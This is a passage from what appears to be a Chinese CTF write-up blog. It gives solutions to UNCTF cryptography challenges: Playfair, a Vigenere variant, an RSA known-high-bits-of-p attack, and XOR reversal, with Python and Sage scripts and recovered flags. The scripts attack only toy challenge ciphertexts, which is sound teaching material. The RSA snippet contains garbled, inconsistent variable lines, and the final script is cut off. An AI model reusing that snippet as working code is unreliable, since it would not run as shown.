class="line">知识点`：`多次一密`，`数据还原</span><br></pre></td></tr></table></figure><ul><li><p>一个假题，劣质多次一密QAQ</p></li><li><p>decode密文，伪造flag与密文异或得到残缺明文，寻找英文单词特征比对求解，1小时的快乐没了</p><blockquote><p>UNCTF{Y0u_are_very_Clever!!!}</p></blockquote></li></ul><h3 id="Single-table-西南科技大学"><a href="#Single-table-西南科技大学" class="headerlink" title="Single table-西南科技大学"></a>Single table-西南科技大学</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知识点`：`playfair</span><br></pre></td></tr></table></figure><ul><li><p>很明显变种Playfair加密</p></li><li><p>根据实例修改表</p></li><li><p>B C D E F<br>G H I K M<br>N O Q R S<br>T U V W X<br>Z P L A Y</p></li><li><p>还原即可</p><ul><li>不同行不同列优先取后一个字母对应行元素</li><li>同行取左</li><li>同列取上</li></ul></li><li><p>得到（注意下划线位置要换一下，哦对还有去掉x，我记得有人有群u吐槽这个下划线来着）</p><blockquote><p>UNCTF{GOD_YOU_KNOW_PLAYFAIR}</p></blockquote></li></ul><h3 id="Multi-table-西南科技大学"><a href="#Multi-table-西南科技大学" class="headerlink" title="Multi table-西南科技大学"></a>Multi table-西南科技大学</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知识点`：`维吉尼亚密码（Vigenere）</span><br></pre></td></tr></table></figure><h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><ul><li>这个题就是构造了一个循环序的字母字典table</li><li>还有一个乱序的匹配字母表base_table</li><li>然后随机生成查询key</li><li>加密flag<ul><li>首先查询base_table中字母位置</li><li>替换为字典key键对应位置的值</li></ul></li></ul><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><ul><li><p>首先用UNCT还原出key是多少，再逆写加密就可</p></li><li><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字典表</span></span><br><span class="line">table = &#123;<span class="number">0</span>: <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;BCDEFGHIJKLMNOPQRSTUVWXYZA&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;CDEFGHIJKLMNOPQRSTUVWXYZAB&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;DEFGHIJKLMNOPQRSTUVWXYZABC&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;EFGHIJKLMNOPQRSTUVWXYZABCD&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;FGHIJKLMNOPQRSTUVWXYZABCDE&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;GHIJKLMNOPQRSTUVWXYZABCDEF&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;HIJKLMNOPQRSTUVWXYZABCDEFG&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;IJKLMNOPQRSTUVWXYZABCDEFGH&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;JKLMNOPQRSTUVWXYZABCDEFGHI&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;KLMNOPQRSTUVWXYZABCDEFGHIJ&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;LMNOPQRSTUVWXYZABCDEFGHIJK&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;MNOPQRSTUVWXYZABCDEFGHIJKL&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;NOPQRSTUVWXYZABCDEFGHIJKLM&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;OPQRSTUVWXYZABCDEFGHIJKLMN&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;PQRSTUVWXYZABCDEFGHIJKLMNO&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;QRSTUVWXYZABCDEFGHIJKLMNOP&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;RSTUVWXYZABCDEFGHIJKLMNOPQ&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;STUVWXYZABCDEFGHIJKLMNOPQR&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;TUVWXYZABCDEFGHIJKLMNOPQRS&#x27;</span>, <span class="number">20</span>: <span class="string">&#x27;UVWXYZABCDEFGHIJKLMNOPQRST&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;VWXYZABCDEFGHIJKLMNOPQRSTU&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;WXYZABCDEFGHIJKLMNOPQRSTUV&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;XYZABCDEFGHIJKLMNOPQRSTUVW&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;YZABCDEFGHIJKLMNOPQRSTUVWX&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;ZABCDEFGHIJKLMNOPQRSTUVWXY&#x27;</span>&#125;</span><br><span class="line"><span class="comment"># 乱序表</span></span><br><span class="line">base_table=[<span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]</span><br><span class="line"><span class="comment"># 密文flag</span></span><br><span class="line">flag = <span class="string">&#x27;SDCGW&#123;MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD&#125;&#x27;</span></span><br><span class="line"><span class="comment"># 还原key</span></span><br><span class="line"><span class="built_in">print</span>(base_table.index(<span class="string">&#x27;U&#x27;</span>)) <span class="comment">#0  9</span></span><br><span class="line"><span class="built_in">print</span>(base_table.index(<span class="string">&#x27;N&#x27;</span>)) <span class="comment">#1  14</span></span><br><span class="line"><span class="built_in">print</span>(base_table.index(<span class="string">&#x27;C&#x27;</span>)) <span class="comment">#2  5</span></span><br><span class="line"><span class="built_in">print</span>(base_table.index(<span class="string">&#x27;T&#x27;</span>)) <span class="comment">#3  16</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">if</span> table[i][<span class="number">9</span>] == <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;key0=&#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> table[i][<span class="number">14</span>] == <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;key1=&#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> table[i][<span class="number">5</span>] == <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;key2=&#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> table[i][<span class="number">16</span>] == <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;key3=&#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line"><span class="comment"># 还原flag</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">key=[<span class="number">9</span>,<span class="number">15</span>,<span class="number">23</span>,<span class="number">16</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> flag[i] <span class="keyword">in</span> base_table:</span><br><span class="line">        <span class="built_in">print</span>(base_table[table[key[x%<span class="number">4</span>]].index(flag[i])],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag[i],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># UNCTF&#123;WOW_YOU_KNOW_THIS_IS_VIGENERE_CIPHER&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="easy-RSA-中国人民公安大学"><a href="#easy-RSA-中国人民公安大学" class="headerlink" title="easy_RSA-中国人民公安大学"></a>easy_RSA-中国人民公安大学</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知识点`:`rsa已知p高位攻击</span><br></pre></td></tr></table></figure><ul><li><p>看到&gt;&gt;200，是个RSA高位攻击，直接开搞</p></li><li><p>去网站<a href="https://sagecell.sagemath.org/">Sage Cell Server (sagemath.org)</a> 先把roots爆出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span></span><br><span class="line">p2 = 8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857s</span><br><span class="line">p4 = p4 &lt;&lt; <span class="number">200</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^<span class="number">200</span>,beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="built_in">print</span>(roots)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br></pre></td></tr></table></figure></li><li><p>解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">roots = [<span class="number">358950849615278333731635244854025425463656033006805723630685</span>]</span><br><span class="line">n = <span class="number">102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span></span><br><span class="line">p2 = <span class="number">13150231070519276795503757637337326535824298772055543325920447062237907554543786311611680606623830215547787830024125178567428699965091733811241451081695232</span></span><br><span class="line">p= p2 + roots[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> n%p == <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">q = n//p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">c=<span class="number">6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure></li></ul><h3 id="Today-is-Thursday-V-me-50-海南大学"><a href="#Today-is-Thursday-V-me-50-海南大学" class="headerlink" title="Today_is_Thursday_V_me_50-海南大学"></a>Today_is_Thursday_V_me_50-海南大学</h3><ul><li><p>这个题就是纯考察逆向解密能力，大喜，啊不，大悲</p></li><li><p>对flag先加密1，再加密2，得到结果。逆写，还是逆写</p></li><li><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 题目信息</span></span><br><span class="line">key1 = <span class="string">b&#x27;Today_is_Thursday_V_me_50&#x27;</span></span><br><span class="line">key1_num = <span class="number">530007872419584476649862008487908643412379763189507583587632</span></span><br><span class="line">x = <span class="string">&#x27;Q\x19)T\x18\x1b(\x03\t^c\x08QiF&gt;Py\x124DNg3P&#x27;</span></span><br><span class="line"><span class="comment">#生成25位随机数序列</span></span><br><span class="line">random.seed(key1_num)</span><br><span class="line">ran = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    temp_num = random.randint(<span class="number">1</span>,<span class="number">128</span>)</span><br><span class="line">    ran.append(temp_num)</span><br><span class="line"><span class="comment"># 异或解密（encrypt2）</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(x)):</span><br><span class="line">    temp = bytes_to_long(<span class="built_in">bytes</span>(x[i], encoding=<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    flag.append(temp^ran[i])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 仿写encrypt1，得出最后的异或串</span></span><br><span class="line">guess=[(<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, 